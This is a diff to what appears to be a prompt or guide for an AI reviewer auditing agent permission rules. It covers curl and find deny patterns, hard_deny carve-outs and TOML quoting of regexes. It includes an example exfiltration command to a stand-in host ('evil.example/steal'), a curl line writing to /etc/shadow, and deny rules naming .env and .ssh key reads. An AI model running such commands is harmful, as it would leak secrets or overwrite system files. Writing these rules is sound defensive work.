@@ -298,6 +298,24 @@ Look for what the deterministic detectors cannot, for example:
 - **Over-broad matches** -- globs/regexes whose real-world match set is far wider or
   more dangerous than it looks; deny rules that are trivially side-stepped by an
   equivalent command spelling.
+- **A trailing `:*` that spans arguments, on a rule naming a host, path, or URL
+  prefix.** A DEFAULT pattern's trailing `:*` crosses spaces, not just characters
+  within one token, matching native's own semantics for that shorthand (see
+  `docs/native-pattern-reference.md` row 18/19 -- a hand-written trailing ` *`
+  diverges on a bare no-argument command, row 18). A rule like
+  `Bash(curl http://localhost:*)` therefore does not stop at the host: it also
+  matches anything space-separated after it on the same command line, including
+  an unrelated second URL (`curl http://localhost http://evil.example/steal`) or
+  a write flag (`curl http://localhost -o /etc/shadow`) -- but NOT a URL
+  continued without a space (`curl http://localhost/health` does not match; the
+  boundary requires a space or end-of-string). This is **faithful, not a bug** --
+  do not recommend narrowing the matcher -- but it is worth flagging to the user,
+  especially on a `hard_deny.allow` carve-out, where the exemption is silent and
+  the whole point was to narrow, not to re-open, the surrounding deny. **The fix
+  is not a tighter regex -- it's to stop using `[hard_deny]` for a rule that needs
+  a carve-out at all.** `hard_deny` means no exceptions; a rule with one belongs
+  at the ordinary deny/allow level, where a more-specific allow can legitimately
+  override it. See fix #5 below.
 - **Less-obvious execution / exfiltration** -- allows that grant code execution or
   network egress via non-obvious binaries or subcommands (make, cmake, npm/yarn
   scripts, git hooks/aliases, package installers, `ssh`, `curl|sh`, etc.).
@@ -343,20 +361,28 @@ description of the problem:
 - **Arbitrary execution -> recommend DELETION** (or replacement by specific allows),
   never a rewrite that keeps the escape hatch.
 
+**TOML note**: emit every `[regex]` pattern that contains a backslash as a single-quoted
+TOML literal string, e.g. `'Bash([regex]\bfind\b)'`. A double-quoted string containing an
+escape TOML doesn't recognise (`\s`, `\d`, `\.`, ...) fails to *parse* -- loud and safe. A
+double-quoted string where every escape happens to be TOML-valid (`\b`, `\t`, `\n`, ...) is
+worse: it parses cleanly and is silently reinterpreted (`\b` becomes a literal backspace,
+not a regex word boundary), so the rule loads and matches nothing. Single-quoting sidesteps
+the whole class of mistake.
+
 Few-shot examples (style, not a fixed catalogue):
 
 1. **Inline replacement** -- complete an incomplete guard:
-   - finding: `Bash([regex]\bfind\b(?!.*\s-(exec|execdir|delete)\b))` misses the write
+   - finding: `'Bash([regex]\bfind\b(?!.*\s-(exec|execdir|delete)\b))'` misses the write
      trapdoors `-fprintf`/`-fprint`/`-fls`/`-ok`/`-okdir`.
    - fix (replace the one rule):
-     `Bash([regex]\bfind\b(?!.*\s-(exec|execdir|ok|okdir|delete|fprintf|fprint|fls)\b))`
+     `'Bash([regex]\bfind\b(?!.*\s-(exec|execdir|ok|okdir|delete|fprintf|fprint|fls)\b))'`
 
 2. **Rule combination across sections** -- close a secret-read gap without narrowing
    normal use (KEEP the broad allows; ADD denies; deny by file token, not per reader):
    - finding: `.env`/`.ssh` reads slip through un-denied tools (`grep .env`, `tail ~/.ssh/id_rsa`).
    - fix (add these denies):
-     `Bash([regex]\.env\b)`        -- any Bash command naming a .env file (all readers)
-     `Bash([regex]\.ssh/)`         -- any Bash command touching a .ssh path (no leading
+     `'Bash([regex]\.env\b)'`       -- any Bash command naming a .env file (all readers)
+     `'Bash([regex]\.ssh/)'`        -- any Bash command touching a .ssh path (no leading
                                       slash: `\.ssh/` catches relative AND absolute)
      `Read([glob]**/.env)` `Read([glob]**/.ssh/**)`  -- the Read/Edit/Write tool path
 
@@ -369,6 +395,34 @@ Few-shot examples (style, not a fixed catalogue):
    - finding: `Bash([regex]rm /home/.../memory/.*)` is unanchored (`re.search`) -- it
      matches the substring anywhere in a command.
    - fix: `Bash([regex]^rm /home/.../memory/[^;&|]*$)`.
+
+5. **Stop hard-denying a rule that needs a carve-out; move it to the ordinary level:**
+   - finding: `hard_deny.deny = ["Bash(curl:*)"]` / `hard_deny.allow =
+     ["Bash(curl http://localhost:*)"]` -- the trailing `:*` spans arguments, so the
+     carve-out exempts anything appended after the localhost URL too, including a
+     second URL to an arbitrary host. `hard_deny` cannot be overridden by a
+     more-specific allow, so a carve-out that turns out too broad -- or a
+     replacement pattern that turns out too narrow to be usable -- is an
+     unoverridable problem either way.
+   - fix: `hard_deny` means no exceptions; a rule that needs one belongs at the
+     ordinary deny/allow level instead, where a more-specific allow legitimately
+     overrides it and a too-narrow allow costs one more line, not an unoverridable
+     hole.
+     **But check first whether a deny-with-exception can work for this tool at
+     all.** It works only when either the SAFE set or the DANGEROUS set is closed
+     and enumerable. For `curl`, NEITHER is: `-o` writes a file, `-L` redirects
+     anywhere, and a second bare URL exfiltrates, all in the same syntax as
+     ordinary use -- so a pattern loose enough for real work admits the dangerous
+     forms. **Recommend `ask` for `curl`**, and note that Claude's built-in
+     WebFetch covers almost every legitimate use.
+     Where the dangerous set IS enumerable, the recipe applies -- `find` is the
+     worked example: `deny = ['Bash(find:*)']` at a shared level paired with
+     `allow = ['Bash([regex]^find\b(?!.*\s-(exec|execdir|ok|okdir|delete|fprintf|fprint|fls)\b))']`
+     at a more specific one. Both TOML **literal** strings; double-quoted, `\b`
+     is a valid TOML escape for backspace and the rule silently matches nothing.
+     Verified 7/7 ordinary invocations allowed and 6/6 destructive ones excluded.
+     See
+     [agent-guides.md](../../../docs/agent-guides.md#recipe-deny-a-command-with-a-legitimate-exception).
 
 ### Proposed edits (ONLY when `context.proposed_edits` is present -- otherwise skip entirely)
 
